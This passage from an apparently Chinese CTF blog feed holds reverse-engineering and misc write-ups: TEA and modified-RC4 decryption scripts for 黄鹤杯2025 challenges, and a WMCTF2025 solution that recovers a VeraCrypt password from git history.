class="hljs-number">0xB2</span>,<span class="hljs-number">0xAE</span>,<span class="hljs-number">0x4A</span>,<span class="hljs-number">0xB5</span>,<span class="hljs-number">0xC5</span>,<span class="hljs-number">0x69</span>,<span class="hljs-number">0xB7</span>,<span class="hljs-number">0xA8</span>,<span class="hljs-number">0x03</span>,<span class="hljs-number">0xD1</span>,<span class="hljs-number">0xAE</span>,<span class="hljs-number">0xCF</span>,<br>        <span class="hljs-number">0xC6</span>,<span class="hljs-number">0x2C</span>,<span class="hljs-number">0x5B</span>,<span class="hljs-number">0x7F</span>,<span class="hljs-number">0xA2</span>,<span class="hljs-number">0x86</span>,<span class="hljs-number">0x1E</span>,<span class="hljs-number">0x1A</span><br>    ])<br><br>    cipher = <span class="hljs-built_in">bytearray</span>(enc)<br><br>    p1 = <span class="hljs-number">0</span><br>    p2 = <span class="hljs-number">4</span><br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>, <span class="hljs-number">1</span>, -<span class="hljs-number">2</span>):<br>        p3 = i * <span class="hljs-number">4</span><br>        p4 = i * <span class="hljs-number">4</span> + <span class="hljs-number">4</span><br><br>        v3 = struct.unpack_from(<span class="hljs-string">&quot;&lt;I&quot;</span>, cipher, p3)[<span class="hljs-number">0</span>]<br>        v4 = struct.unpack_from(<span class="hljs-string">&quot;&lt;I&quot;</span>, cipher, p4)[<span class="hljs-number">0</span>]<br>        v1 = struct.unpack_from(<span class="hljs-string">&quot;&lt;I&quot;</span>, cipher, p1)[<span class="hljs-number">0</span>]<br>        v2 = struct.unpack_from(<span class="hljs-string">&quot;&lt;I&quot;</span>, cipher, p2)[<span class="hljs-number">0</span>]<br><br>        v3 ^= v1<br>        v4 ^= v2<br>        struct.pack_into(<span class="hljs-string">&quot;&lt;I&quot;</span>, cipher, p3, v3)<br>        struct.pack_into(<span class="hljs-string">&quot;&lt;I&quot;</span>, cipher, p4, v4)<br><br>        tmp = <span class="hljs-built_in">list</span>(struct.unpack_from(<span class="hljs-string">&quot;&lt;2I&quot;</span>, cipher, <span class="hljs-number">0</span>))<br>        tmp = tea_decrypt(tmp, Key)<br>        struct.pack_into(<span class="hljs-string">&quot;&lt;2I&quot;</span>, cipher, <span class="hljs-number">0</span>, *tmp)<br><br>    tmp = <span class="hljs-built_in">list</span>(struct.unpack_from(<span class="hljs-string">&quot;&lt;2I&quot;</span>, cipher, <span class="hljs-number">0</span>))<br>    tmp = tea_decrypt(tmp, Key)<br>    struct.pack_into(<span class="hljs-string">&quot;&lt;2I&quot;</span>, cipher, <span class="hljs-number">0</span>, *tmp)<br><br>    <span class="hljs-built_in">print</span>(cipher.decode(<span class="hljs-string">&quot;ascii&quot;</span>, errors=<span class="hljs-string">&quot;ignore&quot;</span>))<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br><br>    <br>//flag&#123;unitygame_I5S0ooFunny_Isnotit?????&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>reverse比赛复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-reverse-wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>黄鹤杯2025</title>
    <link href="/2025/09/28/%E9%BB%84%E9%B9%A4%E6%9D%AF2025/"/>
    <url>/2025/09/28/%E9%BB%84%E9%B9%A4%E6%9D%AF2025/</url>
    
    <content type="html"><![CDATA[<h1 id="系统调试"><a href="#系统调试" class="headerlink" title="系统调试"></a>系统调试</h1><p>.bin文件直接反编译，看到这里其实就是主逻辑，</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202509282135126.png" alt="image-20250928213452995"></p><p>sub_40074D函数是加密函数<img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202509282135164.png" alt="image-20250928213539087"></p><p>解密代码：密码是rotors</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs py">v7 = [<span class="hljs-number">5</span>, <span class="hljs-number">2</span>, <span class="hljs-number">7</span>, <span class="hljs-number">2</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>]<br>password = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> v7:<br>    char_code = i + <span class="hljs-number">109</span><br>    password.append(<span class="hljs-built_in">chr</span>(char_code))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;解密得到的密码是：&quot;</span>, <span class="hljs-string">&#x27;&#x27;</span>.join(password))<br></code></pre></td></tr></table></figure><p>其实这就是最终的flag{rotors}</p><p>题外话：当时一直在分析rev1程序，思考这两个程序的联系，一直在想有什么办法找到环境变量，但是这题根本和这个没关系。也是逆天了，出这种题还是1000分的有什么意思。</p><h1 id="antiapk"><a href="#antiapk" class="headerlink" title="antiapk"></a>antiapk</h1><p>直接看java层吧，其实能看到两个.so文件，另一个libluajava.so，当时其实能推测出可能主逻辑和lua代码有关</p><p>在看JNI调用那些其实都是假的逻辑，在sub_9950函数能看到真实的逻辑</p><p>这个函数调用了lua jit去解密，密钥是82ns65ig1，最终比较的密文是95 01 3C 79 F8 4A 84 85 B6 2F 2E 9A F4 AB A5 73 </p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202509292150104.png" alt="image-20250929215055046"></p><p>先从buf中提取出lua字节码，然后用</p><p><a href="https://github.com/marsinator358/luajit-decompiler-v2/releases/tag/Mar_24_2024%E5%8F%8D%E7%BC%96%E8%AF%91%E5%BE%97%E5%88%B0lua%E4%BB%A3%E7%A0%81">https://github.com/marsinator358/luajit-decompiler-v2/releases/tag/Mar_24_2024反编译得到lua代码</a></p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setText</span><span class="hljs-params">(arg_1_0, arg_1_1)</span></span><br>arg_1_0:setText(<span class="hljs-string">&quot;set by Lua: &quot;</span> .. arg_1_1)<br>arg_1_0:setTextSize(<span class="hljs-number">50</span>)<br><span class="hljs-keyword">end</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">tog</span><span class="hljs-params">(arg_2_0, arg_2_1)</span></span><br><span class="hljs-keyword">return</span><br><span class="hljs-keyword">end</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">add</span><span class="hljs-params">(arg_3_0, arg_3_1)</span></span><br><span class="hljs-keyword">return</span> arg_3_0 + arg_3_1<br><span class="hljs-keyword">end</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">RSA</span><span class="hljs-params">(arg_4_0)</span></span><br><span class="hljs-keyword">local</span> var_4_0 = <span class="hljs-built_in">string</span>.<span class="hljs-built_in">len</span>(arg_4_0)<br><span class="hljs-keyword">local</span> var_4_1 = &#123;&#125;<br><span class="hljs-keyword">local</span> var_4_2 = &#123;&#125;<br><br><span class="hljs-keyword">for</span> iter_4_0 = <span class="hljs-number">0</span>, <span class="hljs-number">255</span> <span class="hljs-keyword">do</span><br>var_4_1[iter_4_0] = iter_4_0<br><span class="hljs-keyword">end</span><br><br>var_4_1[<span class="hljs-number">3</span>] = <span class="hljs-number">23</span><br>var_4_1[<span class="hljs-number">8</span>] = <span class="hljs-number">57</span><br><br><span class="hljs-keyword">for</span> iter_4_1 = <span class="hljs-number">1</span>, var_4_0 <span class="hljs-keyword">do</span><br>var_4_2[iter_4_1 - <span class="hljs-number">1</span>] = <span class="hljs-built_in">string</span>.<span class="hljs-built_in">byte</span>(arg_4_0, iter_4_1, iter_4_1)<br><span class="hljs-keyword">end</span><br><br><span class="hljs-keyword">local</span> var_4_3 = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">for</span> iter_4_2 = <span class="hljs-number">0</span>, <span class="hljs-number">255</span> <span class="hljs-keyword">do</span><br>var_4_3 = (var_4_3 + var_4_1[iter_4_2] + var_4_2[iter_4_2 % var_4_0]) % <span class="hljs-number">256</span><br>var_4_1[iter_4_2], var_4_1[var_4_3] = var_4_1[var_4_3], var_4_1[iter_4_2]<br><span class="hljs-keyword">end</span><br><br><span class="hljs-keyword">return</span> var_4_1<br><span class="hljs-keyword">end</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">PRGA</span><span class="hljs-params">(arg_5_0, arg_5_1)</span></span><br><span class="hljs-keyword">local</span> var_5_0 = <span class="hljs-number">0</span><br><span class="hljs-keyword">local</span> var_5_1 = <span class="hljs-number">0</span><br><span class="hljs-keyword">local</span> var_5_2 = &#123;&#125;<br><br><span class="hljs-keyword">for</span> iter_5_0 = <span class="hljs-number">1</span>, arg_5_1 <span class="hljs-keyword">do</span><br>var_5_0 = (var_5_0 + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>var_5_1 = (var_5_1 + arg_5_0[var_5_0]) % <span class="hljs-number">256</span><br>arg_5_0[var_5_0], arg_5_0[var_5_1] = arg_5_0[var_5_1], arg_5_0[var_5_0]<br>var_5_2[iter_5_0] = arg_5_0[(arg_5_0[var_5_0] + arg_5_0[var_5_1]) % <span class="hljs-number">256</span>]<br><span class="hljs-keyword">end</span><br><br><span class="hljs-keyword">return</span> var_5_2<br><span class="hljs-keyword">end</span><br><br><span class="hljs-keyword">local</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">var_0_0</span><span class="hljs-params">(arg_6_0)</span></span><br>arg_6_0 = <span class="hljs-built_in">string</span>.<span class="hljs-built_in">gsub</span>(arg_6_0, <span class="hljs-string">&quot;(.)&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">(arg_7_0)</span></span><br><span class="hljs-keyword">return</span> <span class="hljs-built_in">string</span>.<span class="hljs-built_in">format</span>(<span class="hljs-string">&quot;%02X &quot;</span>, <span class="hljs-built_in">string</span>.<span class="hljs-built_in">byte</span>(arg_7_0))<br><span class="hljs-keyword">end</span>)<br><br><span class="hljs-keyword">return</span> arg_6_0<br><span class="hljs-keyword">end</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">RSB</span><span class="hljs-params">(arg_8_0, arg_8_1, arg_8_2)</span></span><br><span class="hljs-keyword">local</span> var_8_0 = <span class="hljs-built_in">string</span>.<span class="hljs-built_in">len</span>(arg_8_2)<br><span class="hljs-keyword">local</span> var_8_1 = RSA(arg_8_1)<br><span class="hljs-keyword">local</span> var_8_2 = PRGA(var_8_1, var_8_0)<br><br><span class="hljs-keyword">return</span> var_0_0(sxor(arg_8_0, var_8_2, arg_8_2))<br><span class="hljs-keyword">end</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sxor</span><span class="hljs-params">(arg_9_0, arg_9_1, arg_9_2)</span></span><br><span class="hljs-keyword">local</span> var_9_0 = <span class="hljs-built_in">string</span>.<span class="hljs-built_in">len</span>(arg_9_2)<br><span class="hljs-keyword">local</span> var_9_1<br><span class="hljs-keyword">local</span> var_9_2 = &#123;&#125;<br><br><span class="hljs-keyword">for</span> iter_9_0 = <span class="hljs-number">1</span>, var_9_0 <span class="hljs-keyword">do</span><br><span class="hljs-keyword">local</span> var_9_3 = <span class="hljs-built_in">string</span>.<span class="hljs-built_in">byte</span>(arg_9_2, iter_9_0, iter_9_0)<br><br>var_9_2[iter_9_0] = <span class="hljs-built_in">string</span>.<span class="hljs-built_in">char</span>(bxor(arg_9_1[iter_9_0], var_9_3))<br><span class="hljs-keyword">end</span><br><br><span class="hljs-keyword">return</span> <span class="hljs-built_in">table</span>.<span class="hljs-built_in">concat</span>(var_9_2)<br><span class="hljs-keyword">end</span><br><br><span class="hljs-keyword">local</span> var_0_1 = &#123;<br>cond_and = <span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">(arg_10_0, arg_10_1)</span></span><br><span class="hljs-keyword">return</span> arg_10_0 + arg_10_1 == <span class="hljs-number">2</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span> <span class="hljs-keyword">or</span> <span class="hljs-number">0</span><br><span class="hljs-keyword">end</span>,<br>cond_xor = <span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">(arg_11_0, arg_11_1)</span></span><br><span class="hljs-keyword">return</span> arg_11_0 + arg_11_1 == <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span> <span class="hljs-keyword">or</span> <span class="hljs-number">0</span><br><span class="hljs-keyword">end</span>,<br>cond_or = <span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">(arg_12_0, arg_12_1)</span></span><br><span class="hljs-keyword">return</span> arg_12_0 + arg_12_1 &gt; <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span> <span class="hljs-keyword">or</span> <span class="hljs-number">0</span><br><span class="hljs-keyword">end</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">var_0_1.base</span><span class="hljs-params">(arg_13_0, arg_13_1, arg_13_2)</span></span><br><span class="hljs-keyword">if</span> arg_13_1 &lt; arg_13_2 <span class="hljs-keyword">then</span><br>arg_13_1, arg_13_2 = arg_13_2, arg_13_1<br><span class="hljs-keyword">end</span><br><br><span class="hljs-keyword">local</span> var_13_0 = <span class="hljs-number">0</span><br><span class="hljs-keyword">local</span> var_13_1 = <span class="hljs-number">1</span><br><br><span class="hljs-keyword">while</span> arg_13_1 ~= <span class="hljs-number">0</span> <span class="hljs-keyword">do</span><br>r_a = arg_13_1 % <span class="hljs-number">2</span><br>r_b = arg_13_2 % <span class="hljs-number">2</span><br>var_13_0 = var_13_1 * var_0_1[arg_13_0](r_a, r_b) + var_13_0<br>var_13_1 = var_13_1 * <span class="hljs-number">2</span><br>arg_13_1 = <span class="hljs-built_in">math</span>.<span class="hljs-built_in">modf</span>(arg_13_1 / <span class="hljs-number">2</span>)<br>arg_13_2 = <span class="hljs-built_in">math</span>.<span class="hljs-built_in">modf</span>(arg_13_2 / <span class="hljs-number">2</span>)<br><span class="hljs-keyword">end</span><br><br><span class="hljs-keyword">return</span> var_13_0<br><span class="hljs-keyword">end</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">bxor</span><span class="hljs-params">(arg_14_0, arg_14_1)</span></span><br><span class="hljs-keyword">return</span> var_0_1.base(<span class="hljs-string">&quot;cond_xor&quot;</span>, arg_14_0, arg_14_1)<br><span class="hljs-keyword">end</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">band</span><span class="hljs-params">(arg_15_0, arg_15_1)</span></span><br><span class="hljs-keyword">return</span> var_0_1.base(<span class="hljs-string">&quot;cond_and&quot;</span>, arg_15_0, arg_15_1)<br><span class="hljs-keyword">end</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">bor</span><span class="hljs-params">(arg_16_0, arg_16_1)</span></span><br><span class="hljs-keyword">return</span> var_0_1.base(<span class="hljs-string">&quot;cond_or&quot;</span>, arg_16_0, arg_16_1)<br><span class="hljs-keyword">end</span><br><br></code></pre></td></tr></table></figure><p>主要逻辑是rc4，但把s-box和位运算做了魔改</p><p>脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4_decrypt</span>(<span class="hljs-params">ciphertext: <span class="hljs-built_in">bytes</span>, key: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br><br>    S = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))<br>    S[<span class="hljs-number">3</span>] = <span class="hljs-number">23</span><br>    S[<span class="hljs-number">8</span>] = <span class="hljs-number">57</span><br><br>    key_bytes = key.encode()<br>    key_len = <span class="hljs-built_in">len</span>(key_bytes)<br><br><br>    j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        j = (j + S[i] + key_bytes[i % key_len]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br><br><br>    i = <span class="hljs-number">0</span><br>    j = <span class="hljs-number">0</span><br>    keystream = []<br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(ciphertext)):<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        j = (j + S[i]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br>        k = S[(S[i] + S[j]) % <span class="hljs-number">256</span>]<br>        keystream.append(k)<br><br><br>    plaintext = <span class="hljs-built_in">bytes</span>([c ^ k <span class="hljs-keyword">for</span> c, k <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(ciphertext, keystream)])<br>    <span class="hljs-keyword">return</span> plaintext<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    key = <span class="hljs-string">&quot;82ns65ig1&quot;</span><br>    ciphertext = <span class="hljs-built_in">bytes</span>([<br>        <span class="hljs-number">0x95</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0x85</span>,<br>        <span class="hljs-number">0xB6</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0xA5</span>, <span class="hljs-number">0x73</span><br>    ])<br><br>    plaintext = rc4_decrypt(ciphertext, key)<br>    <span class="hljs-built_in">print</span>(plaintext.decode(errors=<span class="hljs-string">&quot;ignore&quot;</span>))<br>//flag&#123;aj5oyjs1kf&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>reverse比赛复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-reverse-wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>WMCTF2025-RE</title>
    <link href="/2025/09/23/WMCTF2025-RE/"/>
    <url>/2025/09/23/WMCTF2025-RE/</url>
    
    <content type="html"><![CDATA[<h1 id="WMCTF2025-re"><a href="#WMCTF2025-re" class="headerlink" title="WMCTF2025-re"></a>WMCTF2025-re</h1><h2 id="catfriend"><a href="#catfriend" class="headerlink" title="catfriend"></a>catfriend</h2><p>查找字符串WMCTF{5a3e8f2b-1c7d-4a6f-b89e-0d3c2f1a4b5c}</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202509232110485.png" alt="image-20250923210809834"></p><h2 id="appfriend"><a href="#appfriend" class="headerlink" title="appfriend"></a>appfriend</h2><p>待更新…</p>]]></content>
    
    
    <categories>
      
      <category>reverse比赛复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-reverse-wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>WMCTF2025-GitHacker</title>
    <link href="/2025/09/23/WMCTF2025/"/>
    <url>/2025/09/23/WMCTF2025/</url>
    
    <content type="html"><![CDATA[<h1 id="Misc-——GitHacker"><a href="#Misc-——GitHacker" class="headerlink" title="Misc ——GitHacker"></a>Misc ——GitHacker</h1><p>比赛的时候没做出来，赛后看了su师傅们的思路才复现出~</p><p>这是一道关于git库的题，一般这种题的做题思路就是找提交的日志记录，看看能不能找到有用的信息</p><p>先用这个命令查看日志记录</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">git reflog<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202509231924497.png" alt="image-20250923192403391"></p><p>然后查看给出的这两个file</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202509231929705.png" alt="image-20250923192941652"></p><p>显示的是png和jpg后缀</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs powershell"> git show <span class="hljs-number">6</span>ec92bc<br>commit <span class="hljs-number">6</span>ec92bcfdf3044bf21dcfa74500cbb929c0f0037<br>Author: toto &lt;toto@WMCTF2025.com&gt;<br>Date:   Sat Aug <span class="hljs-number">9</span> <span class="hljs-number">17</span>:<span class="hljs-number">14</span>:<span class="hljs-number">06</span> <span class="hljs-number">2025</span> +<span class="hljs-number">0800</span><br><br>    encryptedFile<br><br><span class="hljs-built_in">diff</span> <span class="hljs-literal">--git</span> a/image.png b/image.png<br>new file mode <span class="hljs-number">100644</span><br>index <span class="hljs-number">0000000</span>..<span class="hljs-number">27</span>e6acd<br>Binary files /dev/null and b/image.png differ<br></code></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> E:\下载的附件\GitHacker&gt; git show d504bbf<br>commit d504bbf75693fc83f6cf5c873306b7fc67edd804<br>Author: toto &lt;toto@WMCTF2025.com&gt;<br>Date:   Sat Aug <span class="hljs-number">9</span> <span class="hljs-number">17</span>:<span class="hljs-number">23</span>:<span class="hljs-number">51</span> <span class="hljs-number">2025</span> +<span class="hljs-number">0800</span><br><br>    encryptedFile<br><br><span class="hljs-built_in">diff</span> <span class="hljs-literal">--git</span> a/image.jpg b/image.jpg<br>new file mode <span class="hljs-number">100644</span><br>index <span class="hljs-number">0000000</span>..a3a40e3<br>Binary files /dev/null and b/image.jpg differ<br></code></pre></td></tr></table></figure><p>一开始也是想着往图片隐写的方向去，也能明显的看出两个图片都很大，题目也给了提示其实不是图片文件，这里卡了好久，用的是vc容器挂载，所以得要得到密码</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">a026274 HEAD<span class="hljs-selector-tag">@</span>&#123;<span class="hljs-number">6</span>&#125;: commit: password<br></code></pre></td></tr></table></figure><p>日志记录这一行已经显示password</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> E:\下载的附件\GitHacker&gt; git show a026274<br>commit a026274fb418ec88af16444644fccab9b8a7e8dd (HEAD)<br>Author: toto &lt;toto@WMCTF2025.com&gt;<br>Date:   Sat Aug <span class="hljs-number">9</span> <span class="hljs-number">17</span>:<span class="hljs-number">14</span>:<span class="hljs-number">40</span> <span class="hljs-number">2025</span> +<span class="hljs-number">0800</span><br><br>    password<br><br><span class="hljs-built_in">diff</span> <span class="hljs-literal">--git</span> a/password.md b/password.md<br>new file mode <span class="hljs-number">100644</span><br>index <span class="hljs-number">0000000</span>..<span class="hljs-number">1</span>ab140f<br><span class="hljs-literal">---</span> /dev/null<br>+++ b/password.md<br><span class="hljs-selector-tag">@</span><span class="hljs-selector-tag">@</span> <span class="hljs-literal">-0</span>,<span class="hljs-number">0</span> +<span class="hljs-number">1</span> <span class="hljs-selector-tag">@</span><span class="hljs-selector-tag">@</span><br>+<span class="hljs-string">&quot;EasyP@ssw0rd_from_Git_History&quot;</span><br></code></pre></td></tr></table></figure><p>命令显示密码EasyP@ssw0rd_from_Git_History</p><p>这个密码也可以通过查看blob的内容得到（即查看提交的日志），在objects里查看</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> E:\下载的附件\GitHacker&gt; git <span class="hljs-built_in">cat</span><span class="hljs-operator">-file</span> <span class="hljs-literal">-p</span> <span class="hljs-number">1</span>ab140f15f5fde379ed6a8da68eedef4818adcbb<br><span class="hljs-string">&quot;EasyP@ssw0rd_from_Git_History&quot;</span><br></code></pre></td></tr></table></figure><p>用vc挂载后得到flag第一部分</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202509231941800.png" alt="image-20250923194119759"></p><p>WMCTF{G00d_J0b_F1nding_Th3_0ld_V3rsi0n_</p><p>当时固定思维想找另一个密码，看完了所有文件都没有找到密码</p><p>当时也想过是从文件本身上找问题，但是一直没什么成果</p><p>后面复现看其他师傅的分析下知道了这两个文件的文件头不一样,用010对照看一下</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202509231951210.png" alt="image-20250923195141089"></p><p>这里看了0raN9e师傅的wp，给了一个vc的官方恢复卷头的链接</p><p>按照步骤</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202509232023932.png" alt="image-20250923202329881"></p><p>选择image.png文件 &lt; 工具 &lt; 备份加密卷头信息 &lt; 输入密码 &lt; 不包含隐藏 &lt; 最后随意保存一个文件</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202509232027981.png" 